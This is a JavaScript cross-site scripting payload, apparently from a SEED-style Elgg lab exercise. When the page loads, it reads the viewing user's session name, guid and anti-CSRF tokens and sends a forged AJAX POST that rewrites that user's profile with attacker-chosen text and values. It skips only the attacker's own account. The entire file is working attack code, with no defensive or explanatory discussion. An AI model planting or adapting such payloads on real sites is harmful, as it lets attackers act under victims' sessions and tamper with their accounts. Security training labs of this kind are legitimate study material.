window.onload = function(){
  //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
  //and Security Token __elgg_token
var userName=elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var name="&name="+elgg.session.user.name;
//Construct the content of your url.
var sendurl = "http://www.xsslabelgg.com/action/profile/edit";

var content = token + ts + name + guid + "&description=hack+the+planet&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=1234&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=1234567&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2"

var samyGuid=47;    //FILL IN
if(elgg.session.user.guid!=samyGuid) {
   	//Create and send Ajax request to modify profile
   	var Ajax=null;
   	Ajax=new XMLHttpRequest();
   	Ajax.open("POST",sendurl,true);
	  Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	  Ajax.setRequestHeader("Content-Type",
		              "application/x-www-form-urlencoded");
     Ajax.send(JSON.stringify(content));
  }
}
